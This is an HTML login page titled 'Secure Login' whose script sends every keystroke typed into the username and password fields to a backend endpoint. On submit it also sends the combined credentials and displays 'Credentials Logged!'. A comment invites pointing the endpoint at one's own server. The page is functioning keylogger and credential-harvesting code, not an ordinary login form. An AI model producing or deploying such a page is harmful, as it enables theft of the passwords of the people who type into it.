<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Login</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #fff;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
        }
        .login-container h2 {
            text-align: center;
            color: #333;
            margin-bottom: 20px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        .input-group label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 600;
        }
        .input-group input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 16px;
        }
        .input-group input:focus {
            border-color: #007bff;
            outline: none;
            box-shadow: 0 0 5px rgba(0, 123, 255, 0.3);
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #0056b3;
        }
        .status {
            margin-top: 15px;
            font-size: 14px;
            color: #28a745;
            text-align: center;
        }
    </style>
</head>
<body>

<div class="login-container">
    <h2>Login</h2>
    <form id="loginForm">
        <div class="input-group">
            <label for="username">Username</label>
            <input type="text" id="username" name="username" placeholder="Enter username" autocomplete="off">
        </div>
        <div class="input-group">
            <label for="password">Password</label>
            <input type="password" id="password" name="password" placeholder="Enter password" autocomplete="off">
        </div>
        <button type="submit">Sign In</button>
    </form>
    <div class="status" id="statusMsg">Tracking active...</div>
</div>

<script>
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const statusMsg = document.getElementById('statusMsg');
    const loginForm = document.getElementById('loginForm');

    // State to keep track of the current values
    let currentUsername = '';
    let currentPassword = '';

    // Function to send data to the backend
    async function logKeystrokes(field, value) {
        // Update local state
        if (field === 'username') currentUsername = value;
        if (field === 'password') currentPassword = value;

        // Send to backend (you can change the URL to your server)
        try {
            const response = await fetch('/api/keystrokes', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    field: field,
                    value: value,
                    timestamp: new Date().toISOString()
                })
            });
            statusMsg.textContent = 'Logging...';
            statusMsg.style.color = '#28a745';
        } catch (error) {
            statusMsg.textContent = 'Connection error';
            statusMsg.style.color = 'red';
        }
    }

    // Listen to input events
    usernameInput.addEventListener('input', (e) => {
        logKeystrokes('username', e.target.value);
    });

    passwordInput.addEventListener('input', (e) => {
        logKeystrokes('password', e.target.value);
    });

    // Log final submission
    loginForm.addEventListener('submit', (e) => {
        e.preventDefault();
        logKeystrokes('submission', { username: currentUsername, password: currentPassword });
        statusMsg.textContent = 'Credentials Logged!';
    });
</script>

</body>
</html>
